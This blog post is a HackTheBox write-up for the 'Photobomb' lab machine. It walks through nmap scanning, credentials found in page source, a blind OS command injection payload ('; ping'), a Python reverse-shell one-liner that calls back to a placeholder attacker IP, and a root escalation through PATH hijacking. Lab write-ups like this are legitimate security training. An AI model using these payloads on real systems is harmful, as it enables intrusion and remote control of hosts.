---
date: 2023-02-10 17:32:03
layout: post
title: HackTheBox - Photobomb

description: 
image: /assets/img/htb/photobomb/info.png
optimized_image: /assets/img/htb/photobomb/info.png
category: blog
tags:
  - hackthebox
  - Photobomb
  - web vulnerabilites
  - htb
  - command injection
  - basics privilege escalation
---

# Machine Information
This machine is from easy level worth 20 points.

IP: `10.10.11.182`

# Scanning and Enumeration
First thing add ip to `/etc/hosts` file to allow any dns records.

```bash
nano /etc/hosts
```
Use `nano` to open this file and put ip.

![image](/assets/img/htb/photobomb/nano1.png)

Naturally, we will use `nmap` to identify open ports and collect some information about that machine.

```bash
nmap -A -T5 -p- 10.10.11.182
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-03 00:57 EST
Warning: 10.10.11.182 giving up on port because retransmission cap hit (2).
Stats: 0:01:44 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
Nmap scan report for 10.10.11.182
Host is up (0.094s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   92.39 ms 10.10.14.1
2   91.01 ms 10.10.11.182

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 372.55 seconds
```

After scanning, I found ports 22 and 80 open, so I'll go to Website and dig deeper.

![image](/assets/img/htb/photobomb/website.png)

When you press on `Click here`, a window pops up asking you to enter your username and password.

I'm trying to bypass that popup with basic auth techniques like sql injection, default credentials (admin: admin), nosql, etc.. but all of them didn't work.

After that, I thought that I would see a source code, and I actually found the credentials.

![image](/assets/img/htb/photobomb/source.png)

Use this credentials `pH0t0:b0Mb!` to bypass that popup.

![image](/assets/img/htb/photobomb/pass.png)

After logging in, I only found a download function, and now I'm going to test it.

![image](/assets/img/htb/photobomb/download.png)

Capture the request by burp, Send to repeater and Play in parameters.

The first thing that came to my mind after seeing a request is to try to test the `OS Command Injection` vulnerability in all parameters to find out which parameter is at vulnerable.

The vulnerable parameter is the file type you specified with that payload `; ping -c 10 10.10.11.182` and the result was waiting for the response for about 10 millis to know that this parameter was vulnerable to a `blind OS Command Injection` vulnerability.

I've tried using a number of characters as command separators like `| , || , &` , but only those that have succeeded `;` .

![image](/assets/img/htb/photobomb/burp.png)

Use command injection to get reverse shell.

I tried several payloads but only the [python-reverse-shell](https://highon.coffee/blog/reverse-shell-cheat-sheet/) worked.

```py
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Put that payload in that vulnerable parameter.

![image](/assets/img/htb/photobomb/payload.png)

Listen by netcat.

![image](/assets/img/htb/photobomb/nc.png)

Bingoo, I got the user flag.

![image](/assets/img/htb/photobomb/user.png)

# Privilege Escalation

Use `sudo -l` this option will print out the commands allowed (and forbidden) the user on the current host. 

![image](/assets/img/htb/photobomb/sudo.png)

This shows the current user can use this script `/opt/cleanup.sh` as root.

See the script to exploit it.

![image](/assets/img/htb/photobomb/script.png)

 The last line of the above script it is finding the filetype and it is executing it with root permission.
 
 To exploit it do that call the `find` binary using this relative path instead of the absolute path. By creating a malicious `find`, and modifying the path to include the current working directory, I should be able to abuse this misconfiguration, and escalate our privileges to root.
 
And that is known as a name [PATH-Variable-manipulation](https://systemweakness.com/linux-privilege-escalation-using-path-variable-manipulation-64325ab05469).

Add the current working directory to PATH.

![image](/assets/img/htb/photobomb/path.png)

Create the malicious `find` binary and make it executable.

![image](/assets/img/htb/photobomb/find.png)

Now, Run the script `/opt/cleanup.sh`. 

Great, I become root.

![image](/assets/img/htb/photobomb/who.png)

Bingoo, I got the root flag.

![image](/assets/img/htb/photobomb/root.png)

Thank you for reading and happy hacking🖤😈
